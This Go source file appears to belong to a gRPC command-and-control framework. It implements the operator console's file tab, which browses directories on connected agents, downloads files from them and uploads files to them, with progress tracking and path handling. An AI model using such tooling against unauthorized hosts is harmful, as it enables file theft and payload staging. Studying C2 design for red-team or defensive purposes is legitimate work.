package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode"

	pb "github.com/ardhptr21/c2-grpc/pb"
	tea "github.com/charmbracelet/bubbletea"
)

func (m *operatorModel) applyFileEvent(event *pb.AgentFileEvent) {
	switch event.GetType() {
	case "list_entry":
		if event.GetTransferId() != m.fileListTransferID {
			return
		}
		m.fileEntries = append(m.fileEntries, remoteFileEntry{
			Name:       event.GetMessage(),
			Path:       event.GetPath(),
			IsDir:      event.GetIsDir(),
			Size:       event.GetSize(),
			ModifiedAt: event.GetModifiedAt(),
		})
		m.refreshFileBrowserViewport()
		return
	case "list_done":
		if event.GetTransferId() != m.fileListTransferID {
			return
		}
		m.fileAgentID = event.GetAgentId()
		m.fileBrowserPath = event.GetPath()
		m.fileCurrentDirs[event.GetAgentId()] = event.GetPath()
		m.fileListTransferID = ""
		m.refreshFileBrowserViewport()
		m.status = fmt.Sprintf("Listed directory for agent:%s -> %s", shortAgentID(event.GetAgentId()), event.GetPath())
		return
	case "download_chunk":
		download := m.fileDownloads[event.GetTransferId()]
		if download == nil || download.file == nil {
			return
		}
		if _, err := download.file.Write(event.GetData()); err != nil {
			m.appendFileLog(fmt.Sprintf("[x] download write failed for agent:%s %s -> %s: %v", shortAgentID(event.GetAgentId()), event.GetPath(), download.localPath, err))
			m.closeDownload(event.GetTransferId())
			m.status = "download write error: " + err.Error()
			return
		}
		download.remotePath = event.GetPath()
		download.totalBytes = event.GetTotalBytes()
		download.receivedBytes = event.GetTransferredBytes()
	case "download_done":
		localPath := m.downloadLocalPath(event.GetTransferId())
		if download := m.fileDownloads[event.GetTransferId()]; download != nil {
			download.totalBytes = event.GetTotalBytes()
			download.receivedBytes = event.GetTransferredBytes()
		}
		m.closeDownload(event.GetTransferId())
		m.appendFileLog(fmt.Sprintf("[>] downloaded agent:%s %s -> %s (%s)", shortAgentID(event.GetAgentId()), event.GetPath(), localPath, formatBytes(event.GetTransferredBytes())))
		m.status = "download completed"
	case "upload_progress":
		upload := m.fileUploads[event.GetTransferId()]
		if upload == nil {
			return
		}
		upload.totalBytes = event.GetTotalBytes()
		upload.transferredBytes = event.GetTransferredBytes()
	case "upload_done":
		if upload := m.fileUploads[event.GetTransferId()]; upload != nil {
			upload.totalBytes = event.GetTotalBytes()
			upload.transferredBytes = event.GetTransferredBytes()
		}
		delete(m.fileUploads, event.GetTransferId())
		m.appendFileLog(fmt.Sprintf("[<] uploaded to agent:%s %s (%s)", shortAgentID(event.GetAgentId()), event.GetPath(), formatBytes(event.GetTransferredBytes())))
		m.status = "upload completed"
	case "error":
		if event.GetTransferId() == m.fileListTransferID {
			m.fileListTransferID = ""
		}
		delete(m.fileUploads, event.GetTransferId())
		localPath := m.downloadLocalPath(event.GetTransferId())
		m.closeDownload(event.GetTransferId())
		msg := event.GetMessage()
		if localPath != "" {
			msg = fmt.Sprintf("%s (local: %s)", msg, localPath)
		}
		m.appendFileLog(fmt.Sprintf("[x] file transfer error agent:%s %s", shortAgentID(event.GetAgentId()), msg))
		m.status = "file transfer error: " + event.GetMessage()
	}
	m.refreshFileViewport()
}

func (m *operatorModel) refreshFileViewport() {
	sections := make([]string, 0, 2)
	if m.fileLog != "" {
		sections = append(sections, m.fileLog)
	}
	if len(m.fileUploads) > 0 {
		ids := make([]string, 0, len(m.fileUploads))
		for transferID := range m.fileUploads {
			ids = append(ids, transferID)
		}
		sort.Strings(ids)
		lines := []string{"Active Uploads", ""}
		for _, transferID := range ids {
			upload := m.fileUploads[transferID]
			lines = append(lines, formatUploadProgress(upload))
		}
		sections = append(sections, strings.Join(lines, "\n"))
	}
	if len(m.fileDownloads) > 0 {
		ids := make([]string, 0, len(m.fileDownloads))
		for transferID := range m.fileDownloads {
			ids = append(ids, transferID)
		}
		sort.Strings(ids)
		lines := []string{"Active Downloads", ""}
		for _, transferID := range ids {
			download := m.fileDownloads[transferID]
			lines = append(lines, formatDownloadProgress(download))
		}
		sections = append(sections, strings.Join(lines, "\n"))
	}
	if len(sections) == 0 {
		m.fileViewport.SetContent("No file transfer activity yet.")
		return
	}
	m.fileViewport.SetContent(strings.Join(sections, "\n\n"))
	m.fileViewport.GotoBottom()
}

func (m *operatorModel) refreshFileBrowserViewport() {
	rows := []string{"Remote Browser", "", "Path: " + m.fileBrowserPath, ""}
	if len(m.fileEntries) == 0 {
		rows = append(rows, "No directory entries loaded.")
		m.fileBrowserViewport.SetContent(strings.Join(rows, "\n"))
		return
	}

	sort.Slice(m.fileEntries, func(i, j int) bool {
		if m.fileEntries[i].IsDir != m.fileEntries[j].IsDir {
			return m.fileEntries[i].IsDir
		}
		return strings.ToLower(m.fileEntries[i].Name) < strings.ToLower(m.fileEntries[j].Name)
	})

	for _, entry := range m.fileEntries {
		kind := "FILE"
		size := fmt.Sprintf("%d B", entry.Size)
		if entry.IsDir {
			kind = "DIR "
			size = "-"
		}
		rows = append(rows, fmt.Sprintf("%s  %-8s  %s", kind, size, entry.Name))
	}
	m.fileBrowserViewport.SetContent(strings.Join(rows, "\n"))
	m.fileBrowserViewport.GotoTop()
}

func (m *operatorModel) activateFilesTab() tea.Cmd {
	if len(m.agentOrder) == 0 {
		m.status = "No agent selected."
		return nil
	}
	agentID := m.agentOrder[m.selected]
	agent, ok := m.agents[agentID]
	if !ok || agent.Status == "OFFLINE" || agent.Status == "DEAD" {
		m.status = "Files tab requires a live selected agent."
		return nil
	}
	if m.fileStream == nil {
		m.status = "File service unavailable."
		return nil
	}
	m.activeTab = "files"
	m.fileAgentID = agentID
	if dir := m.fileCurrentDirs[agentID]; dir != "" {
		m.fileBrowserPath = dir
	} else {
		m.fileBrowserPath = "."
	}
	m.status = fmt.Sprintf("File transfer tab ready for agent:%s", shortAgentID(agentID))
	if err := m.listRemoteDir(agentID, m.fileBrowserPath); err != nil {
		m.status = err.Error()
	}
	return nil
}

func (m *operatorModel) handleFileTabKey(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "pgup":
		m.fileBrowserViewport.HalfViewUp()
		return m, nil
	case "pgdown":
		m.fileBrowserViewport.HalfViewDown()
		return m, nil
	case "home":
		m.fileBrowserViewport.GotoTop()
		return m, nil
	case "end":
		m.fileBrowserViewport.GotoBottom()
		return m, nil
	case "ctrl+u":
		m.fileViewport.LineUp(10)
		return m, nil
	case "ctrl+d":
		m.fileViewport.LineDown(10)
		return m, nil
	case "left":
		m.fileBrowserViewport.LineUp(3)
		return m, nil
	case "right":
		m.fileBrowserViewport.LineDown(3)
		return m, nil
	case "up":
		if len(m.agentOrder) > 0 && m.selected > 0 {
			m.selected--
		} else {
			m.fileViewport.LineUp(1)
		}
		return m, nil
	case "down":
		if len(m.agentOrder) > 0 && m.selected < len(m.agentOrder)-1 {
			m.selected++
		} else {
			m.fileViewport.LineDown(1)
		}
		return m, nil
	case "enter":
		return m.handleFileCommand()
	}

	var cmd tea.Cmd
	m.fileInput, cmd = m.fileInput.Update(msg)
	return m, cmd
}

func (m *operatorModel) handleFileCommand() (tea.Model, tea.Cmd) {
	line := strings.TrimSpace(m.fileInput.Value())
	if line == "" {
		m.status = "Enter a file command first."
		return m, nil
	}
	if line == "clear" {
		m.fileLog = ""
		m.refreshFileViewport()
		m.fileInput.SetValue("")
		m.status = "File transfer log cleared."
		return m, nil
	}
	if m.fileStream == nil {
		m.status = "File service unavailable."
		return m, nil
	}
	if len(m.agentOrder) == 0 {
		m.status = "No agents connected."
		return m, nil
	}

	parts, err := parseQuotedArgs(line)
	if err != nil {
		m.status = err.Error()
		return m, nil
	}
	agentID := m.agentOrder[m.selected]
	switch parts[0] {
	case "cd":
		if len(parts) > 2 {
			m.status = "Use: cd <remote_dir>"
			return m, nil
		}
		target := m.currentFileDir()
		if len(parts) == 2 {
			target = resolveRemotePath(m.currentFileDir(), parts[1])
		}
		if err := m.listRemoteDir(agentID, target); err != nil {
			m.status = err.Error()
			return m, nil
		}
	case "ls", "browse":
		remotePath := m.currentFileDir()
		if len(parts) > 1 {
			remotePath = resolveRemotePath(m.currentFileDir(), parts[1])
		}
		if len(parts) > 2 {
			m.status = "Use: ls <remote_dir>"
			return m, nil
		}
		if err := m.listRemoteDir(agentID, remotePath); err != nil {
			m.status = err.Error()
			return m, nil
		}
	case "upload":
		if len(parts) != 3 {
			m.status = "Use: upload <local> <remote>. Quote paths with spaces."
			return m, nil
		}
		if err := m.uploadFile(agentID, parts[1], resolveRemotePath(m.currentFileDir(), parts[2])); err != nil {
			m.status = err.Error()
			return m, nil
		}
	case "download", "pull":
		if len(parts) != 3 {
			m.status = "Use: download <remote> <local>. Quote paths with spaces."
			return m, nil
		}
		if err := m.downloadFile(agentID, resolveRemotePath(m.currentFileDir(), parts[1]), parts[2]); err != nil {
			m.status = err.Error()
			return m, nil
		}
	default:
		m.status = "Unknown file command. Use upload or download."
		return m, nil
	}

	m.fileInput.SetValue("")
	return m, nil
}

func (m *operatorModel) listRemoteDir(agentID, remotePath string) error {
	if strings.TrimSpace(remotePath) == "" {
		remotePath = "."
	}
	transferID := nextTransferID()
	m.fileListTransferID = transferID
	m.fileBrowserPath = remotePath
	m.fileEntries = nil
	m.refreshFileBrowserViewport()
	if err := m.sendFileRequest(&pb.OperatorFileRequest{
		Type:       "list",
		TransferId: transferID,
		AgentId:    agentID,
		Path:       remotePath,
	}); err != nil {
		m.fileListTransferID = ""
		return fmt.Errorf("list remote directory: %w", err)
	}
	m.status = fmt.Sprintf("Loading directory %s for agent:%s", remotePath, shortAgentID(agentID))
	return nil
}

func (m *operatorModel) sendFileRequest(req *pb.OperatorFileRequest) error {
	if m.fileStream == nil {
		return fmt.Errorf("file service unavailable")
	}
	m.fileSendMu.Lock()
	defer m.fileSendMu.Unlock()
	return m.fileStream.Send(req)
}

func parseQuotedArgs(s string) ([]string, error) {
	var (
		args    []string
		current []rune
		inQuote rune
		escaped bool
	)

	flush := func() {
		if len(current) == 0 {
			return
		}
		args = append(args, string(current))
		current = nil
	}

	for _, r := range s {
		switch {
		case escaped:
			current = append(current, r)
			escaped = false
		case r == '\\':
			escaped = true
		case inQuote != 0:
			if r == inQuote {
				inQuote = 0
			} else {
				current = append(current, r)
			}
		case r == '\'' || r == '"':
			inQuote = r
		case unicode.IsSpace(r):
			flush()
		default:
			current = append(current, r)
		}
	}

	if escaped {
		current = append(current, '\\')
	}
	if inQuote != 0 {
		return nil, fmt.Errorf("unterminated quoted path")
	}
	flush()
	return args, nil
}

func (m *operatorModel) uploadFile(agentID, localPath, remotePath string) error {
	f, err := os.Open(localPath)
	if err != nil {
		return fmt.Errorf("open local file: %w", err)
	}

	info, err := f.Stat()
	if err != nil {
		_ = f.Close()
		return fmt.Errorf("stat local file: %w", err)
	}

	sourceName := filepath.Base(localPath)
	transferID := nextTransferID()
	if err := m.sendFileRequest(&pb.OperatorFileRequest{
		Type:       "upload_start",
		TransferId: transferID,
		AgentId:    agentID,
		Path:       remotePath,
		Message:    sourceName,
		TotalBytes: info.Size(),
	}); err != nil {
		_ = f.Close()
		return fmt.Errorf("start upload: %w", err)
	}

	m.fileUploads[transferID] = &activeUpload{
		localPath:  localPath,
		remotePath: remotePath,
		totalBytes: info.Size(),
	}
	go func(transferID, remotePath string, f *os.File) {
		defer f.Close()

		buf := make([]byte, 32*1024)
		for {
			n, err := f.Read(buf)
			if n > 0 {
				if sendErr := m.sendFileRequest(&pb.OperatorFileRequest{
					Type:       "upload_chunk",
					TransferId: transferID,
					Path:       remotePath,
					Data:       append([]byte(nil), buf[:n]...),
				}); sendErr != nil {
					m.events <- fileEventMsg{event: &pb.AgentFileEvent{
						Type:       "error",
						TransferId: transferID,
						AgentId:    agentID,
						Path:       remotePath,
						Message:    sendErr.Error(),
					}}
					return
				}
			}
			if err == io.EOF {
				break
			}
			if err != nil {
				m.events <- fileEventMsg{event: &pb.AgentFileEvent{
					Type:       "error",
					TransferId: transferID,
					AgentId:    agentID,
					Path:       remotePath,
					Message:    err.Error(),
				}}
				return
			}
		}

		if err := m.sendFileRequest(&pb.OperatorFileRequest{
			Type:       "upload_end",
			TransferId: transferID,
			Path:       remotePath,
		}); err != nil {
			m.events <- fileEventMsg{event: &pb.AgentFileEvent{
				Type:       "error",
				TransferId: transferID,
				AgentId:    agentID,
				Path:       remotePath,
				Message:    err.Error(),
			}}
			return
		}
	}(transferID, remotePath, f)

	m.appendFileLog(fmt.Sprintf("[<] uploading %s -> agent:%s %s", localPath, shortAgentID(agentID), remotePath))
	m.refreshFileViewport()
	m.status = "upload started"
	return nil
}

func (m *operatorModel) downloadFile(agentID, remotePath, localPath string) error {
	finalLocalPath, err := resolveLocalTransferTarget(localPath, pathBaseAny(remotePath))
	if err != nil {
		return err
	}
	if err := os.MkdirAll(localParentDir(finalLocalPath), 0o755); err != nil {
		return fmt.Errorf("create local directory: %w", err)
	}
	f, err := os.Create(finalLocalPath)
	if err != nil {
		return fmt.Errorf("create local file: %w", err)
	}

	transferID := nextTransferID()
	m.fileDownloads[transferID] = &activeDownload{
		localPath:  finalLocalPath,
		remotePath: remotePath,
		file:       f,
	}

	if err := m.sendFileRequest(&pb.OperatorFileRequest{
		Type:       "download",
		TransferId: transferID,
		AgentId:    agentID,
		Path:       remotePath,
		Message:    localPath,
	}); err != nil {
		m.closeDownload(transferID)
		return fmt.Errorf("start download: %w", err)
	}

	m.appendFileLog(fmt.Sprintf("[>] downloading agent:%s %s -> %s", shortAgentID(agentID), remotePath, finalLocalPath))
	m.refreshFileViewport()
	m.status = "download started"
	return nil
}

func (m *operatorModel) closeDownload(transferID string) {
	download := m.fileDownloads[transferID]
	delete(m.fileDownloads, transferID)
	if download != nil && download.file != nil {
		_ = download.file.Close()
	}
}

func (m *operatorModel) closeDownloadFiles() {
	for transferID := range m.fileDownloads {
		m.closeDownload(transferID)
	}
}

func (m *operatorModel) downloadLocalPath(transferID string) string {
	download := m.fileDownloads[transferID]
	if download == nil {
		return ""
	}
	return download.localPath
}

func formatUploadProgress(upload *activeUpload) string {
	if upload == nil {
		return ""
	}
	total := upload.totalBytes
	transferred := upload.transferredBytes
	percent := 0.0
	if total > 0 {
		percent = float64(transferred) / float64(total)
		if percent > 1 {
			percent = 1
		}
	}
	barWidth := 18
	filled := int(percent * float64(barWidth))
	if filled > barWidth {
		filled = barWidth
	}
	bar := strings.Repeat("#", filled) + strings.Repeat("-", barWidth-filled)
	return fmt.Sprintf("[%s] %6.1f%%  %s -> %s (%s / %s)", bar, percent*100, upload.localPath, upload.remotePath, formatBytes(transferred), formatBytes(total))
}

func formatDownloadProgress(download *activeDownload) string {
	if download == nil {
		return ""
	}
	total := download.totalBytes
	received := download.receivedBytes
	percent := 0.0
	if total > 0 {
		percent = float64(received) / float64(total)
		if percent > 1 {
			percent = 1
		}
	}
	barWidth := 18
	filled := int(percent * float64(barWidth))
	if filled > barWidth {
		filled = barWidth
	}
	bar := strings.Repeat("#", filled) + strings.Repeat("-", barWidth-filled)
	return fmt.Sprintf("[%s] %6.1f%%  %s -> %s (%s / %s)", bar, percent*100, download.remotePath, download.localPath, formatBytes(received), formatBytes(total))
}

func formatBytes(v int64) string {
	const unit = 1024
	if v < unit {
		return fmt.Sprintf("%d B", v)
	}
	div, exp := int64(unit), 0
	for n := v / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(v)/float64(div), "KMGTPE"[exp])
}

func nextTransferID() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

func localParentDir(path string) string {
	lastSlash := strings.LastIndexAny(path, `/\`)
	if lastSlash == -1 {
		return "."
	}
	if lastSlash == 0 {
		return path[:1]
	}
	return path[:lastSlash]
}

func (m *operatorModel) currentFileDir() string {
	if m.fileAgentID != "" {
		if dir := m.fileCurrentDirs[m.fileAgentID]; dir != "" {
			return dir
		}
	}
	if m.fileBrowserPath != "" {
		return m.fileBrowserPath
	}
	return "."
}

func resolveRemotePath(base, target string) string {
	target = strings.TrimSpace(target)
	if target == "" {
		if base == "" {
			return "."
		}
		return base
	}
	if isAbsoluteRemotePath(target) || base == "" || base == "." {
		return target
	}

	sep := "/"
	if strings.Contains(base, "\\") || strings.Contains(target, "\\") || hasWindowsDrive(base) || hasWindowsDrive(target) {
		sep = "\\"
	}

	normalizedBase := strings.ReplaceAll(base, "\\", "/")
	normalizedTarget := strings.ReplaceAll(target, "\\", "/")
	joined := normalizedBase
	if !strings.HasSuffix(joined, "/") {
		joined += "/"
	}
	joined += normalizedTarget
	parts := strings.Split(joined, "/")
	stack := make([]string, 0, len(parts))
	prefix := ""
	if len(parts) > 0 && hasWindowsDrive(parts[0]) {
		prefix = parts[0]
		parts = parts[1:]
	}
	for _, part := range parts {
		switch part {
		case "", ".":
			continue
		case "..":
			if len(stack) > 0 {
				stack = stack[:len(stack)-1]
			}
		default:
			stack = append(stack, part)
		}
	}

	result := strings.Join(stack, sep)
	if prefix != "" {
		if result == "" {
			return prefix + sep
		}
		return prefix + sep + result
	}
	if strings.HasPrefix(base, "/") || strings.HasPrefix(base, "\\") {
		return sep + result
	}
	if result == "" {
		return "."
	}
	return result
}

func isAbsoluteRemotePath(path string) bool {
	return strings.HasPrefix(path, "/") || strings.HasPrefix(path, "\\") || hasWindowsDrive(path)
}

func hasWindowsDrive(path string) bool {
	return len(path) >= 2 && ((path[0] >= 'A' && path[0] <= 'Z') || (path[0] >= 'a' && path[0] <= 'z')) && path[1] == ':'
}

func resolveLocalTransferTarget(targetPath, sourceName string) (string, error) {
	targetPath = strings.TrimSpace(targetPath)
	if targetPath == "" {
		return "", fmt.Errorf("local target path is required")
	}

	info, err := os.Stat(targetPath)
	if err == nil && info.IsDir() {
		if sourceName == "" {
			return "", fmt.Errorf("source filename is required for directory download")
		}
		return filepath.Join(targetPath, sourceName), nil
	}
	if err != nil && !os.IsNotExist(err) {
		return "", fmt.Errorf("inspect local target: %w", err)
	}
	if strings.HasSuffix(targetPath, string(filepath.Separator)) || strings.HasSuffix(targetPath, "/") || strings.HasSuffix(targetPath, "\\") {
		if sourceName == "" {
			return "", fmt.Errorf("source filename is required for directory download")
		}
		return filepath.Join(targetPath, sourceName), nil
	}
	return targetPath, nil
}

func pathBaseAny(path string) string {
	path = strings.TrimRight(path, `/\`)
	if path == "" {
		return ""
	}
	lastSlash := strings.LastIndexAny(path, `/\`)
	if lastSlash == -1 {
		return path
	}
	return path[lastSlash+1:]
}
